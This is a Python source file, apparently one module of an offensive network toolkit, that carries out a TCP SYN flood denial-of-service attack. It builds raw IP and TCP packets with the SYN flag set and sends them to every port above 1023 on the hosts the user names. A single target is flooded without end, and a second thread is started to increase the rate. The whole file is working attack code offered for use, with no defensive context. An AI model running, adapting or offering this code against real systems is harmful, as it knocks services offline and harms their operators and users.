# Nick Morris and Jordan Miller
from scapy.all import *
from cust_packet import tcp_packet, ip_packet
import socket
import binascii
import os
import threading, time, sys
from color import pcolor


"""
module to run a tcp syn flood attack on user defined target IP's.
currently we flood all non system (>1023) level ports on a target if the 
client provides multiple targets. If the client provides only one target, we
flood it with syn requests infinitely, until manually halted by the user.
"""


def run(targets, src_ip=None):
    # updates to the client
    print("Running SYN flood attack on specified target(s): " + str(targets))
    print("Processing ...")

    # determine if the user wants to go wide or deep with their attack (single target or multiple)
    if (len(targets) > 1):
        # iterate over all defined targets and flood all ports with syn requests
        print('Attack will finish once all IPs have gone through one round of flooding.')
        print('Press Ctrl+C to finish early.')
        for target_ip in targets:
            # get source ip using scapy tool
            if not src_ip:
                src_ip = conf.route.route(target_ip)[1]
            dest_ip = target_ip

            """
            attack the defined targets with flood of syn requests this attack stops after finished
            flooding all ports on provided machines -> wide attack
            """
            try:
                attackMultipleTargets(src_ip, dest_ip)
            except (KeyboardInterrupt, SystemExit):
                print(pcolor.color.ERROR + os.linesep + "caught keyboard interrupt and system exit occurred, halting attack." + pcolor.color.CLEAR)
                sys.exit()

    elif (len(targets) == 0):
        print('No up hosts to perform SYN flood attack on')
    else:
        # get source ip using scapy tool
        dest_ip = targets.pop()
        if not src_ip:
            src_ip = conf.route.route(dest_ip)[1]
        print('Single host will be continually flooded, press Ctrl+C to finish attack.')

        """
        attack the defined target by continuing to send syn requests until manually canceled by the
        attack agent. This attack is narrow/deep.
        """
        try:
            attackSingleTarget(src_ip, dest_ip)
        except (KeyboardInterrupt, SystemExit):
            print(pcolor.color.ERROR + os.linesep + "caught keyboard interrupt and system exit occurred, halting attack." + pcolor.color.CLEAR)
            sys.exit()


def attackMultipleTargets(src_ip, dest_ip):
    # sending everything from 1300 on the host with syn flag set
    src_port = 13000 
    flags = [0,0,0,0,0,0,0,1,0]

    # update the client with the current attack destination
    print ("currently running attack on: " + str(dest_ip))

    # raw socket to connect and send packets
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s_multi:
        s_multi.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s_multi.settimeout(2)

        # flood ports >1023 on the current ip with requests
        for dest_port in range(1024, 65535):
            # construct layers 3 and 4 of the packet (IP and TCP)
            tcp_segment = tcp_packet.create(src_ip, dest_ip, src_port, dest_port, flags)
            packet = ip_packet.create(tcp_segment, src_ip, dest_ip)

            # build and send packet
            s_multi.connect((dest_ip, dest_port))
            try:
                s_multi.send(packet)
            except OSError as e:
                if e.errno == 105:
                    print('Socket buffer full, waiting one second then continuing to flood target.')
                    time.sleep(1)
                else:
                    print(f'Unspecified OSError: {e}')
            except socket.error as e:
                print(f'Unspecified socket error: {e}')


def attackSingleTarget(src_ip, dest_ip):
    # sending everything from 1300 on the host with syn flag on
    src_port = 13000 
    flags = [0,0,0,0,0,0,0,1,0]

    # update the client with the destination and instructions for cancelling.
    print ("currently running attack on: " +  str(dest_ip))
    print ("note: attack will not stop until manually halted from user.")

    # start a thread to increase attack velocity
    try:
        # initiate thread
        thread = threading.Thread(target=attackVelocityIncrease, args=(src_ip, dest_ip))
        # causes the thread to terminate after main process (parent thread) ends
        thread.daemon=True 
        # run thread, increasing attack velocity
        thread.start()
        #while True: time.sleep(100)
    except (KeyboardInterrupt, SystemExit):
        sys.exit()

    # Let the thread get ahead so that our two sockets don't try to connect()
    # to the same port at the same time, because this causes the OS to give an
    # Operation not permitted error
    time.sleep(1)

    # raw socket to connect and send packets
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s_single:
        s_single.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s_single.settimeout(2)
  
        while True:
            # flood ports >1023 on the ip with requests
            for dest_port in range(1024, 65535):
                # construct layers 3 and 4 of the packet (IP and TCP)
                tcp_segment = tcp_packet.create(src_ip, dest_ip, src_port, dest_port, flags)
                packet = ip_packet.create(tcp_segment, src_ip, dest_ip)

                # build and send packet
                s_single.connect((dest_ip, dest_port))
                try:
                    s_single.send(packet)
                except OSError as e:
                    if e.errno == 105:
                        print('Socket buffer full, waiting one second then continuing to flood target.')
                        time.sleep(1)
                    else:
                        print(f'{pcolor.color.ERROR}Unspecified OSError: {e}{pcolor.color.CLEAR}')
                except socket.error as e:
                    print(f'{pcolor.color.ERROR}Unspecified socket error: {e}{pcolor.color.CLEAR}')


# define a destination for multiple threads to stage attack on the same ip, thus increase attack velocity. 
def attackVelocityIncrease(src_ip, dest_ip):
    src_port = 13000 
    flags = [0,0,0,0,0,0,0,1,0]
    
    # raw socket to connect and send packets
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s_velocity:
        s_velocity.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s_velocity.settimeout(2)

        while True:
            # flood ports >1023 on the ip with requests
            for dest_port in range(1024, 65535):
                # construct layers 3 and 4 of the packet (IP and TCP)
                # ip_layer = IP(src=src_ip, dst=dest_ip)
                # tcp_layer = TCP(sport=src_port, dport=dest_port)
                tcp_segment = tcp_packet.create(src_ip, dest_ip, src_port, dest_port, flags)
                packet = ip_packet.create(tcp_segment, src_ip, dest_ip)

                # build and send packet
                s_velocity.connect((dest_ip, dest_port))
                try:
                    s_velocity.send(packet)
                except OSError as e:
                    if e.errno == 105:
                        print('Socket buffer full, waiting one second then continuing to flood target.')
                        time.sleep(1)
                    else:
                        print(f'{pcolor.color.ERROR}Unspecified OSError: {e}{pcolor.color.CLEAR}')
                except socket.error as e:
                    print(f'{pcolor.color.ERROR}Unspecified socket error: {e}{pcolor.color.CLEAR}')

